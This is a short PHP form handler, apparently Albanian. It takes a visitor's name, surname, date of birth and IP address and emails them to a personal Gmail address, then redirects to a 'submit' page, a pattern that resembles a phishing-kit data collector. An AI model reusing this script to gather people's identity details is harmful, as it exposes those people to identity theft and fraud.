<?php

session_start();
if(isset($_SESSION['u'])){
  if($_SESSION['u'] === '123') {
  }else {
  }
}

$emer = $_POST['emer'];

$mbiemri = $_POST['mbiemri'];

$muaji = $_POST['muaji'];

$ditaa = $_POST['ditaa'];

$viti = $_POST['viti'];



$ip = $_SERVER['REMOTE_ADDR'];



$stringi = 'emer: '.$emer . PHP_EOL .'mbiemri: '. $mbiemri.PHP_EOL .'Year:'. $viti.PHP_EOL .'month: '.$muaji . PHP_EOL .'day: '. $ditaa . PHP_EOL. 'IP: '. $ip;
mail("raloqka2021@gmail.com","name and birthday", $stringi);
header("Location: submit.html");

?>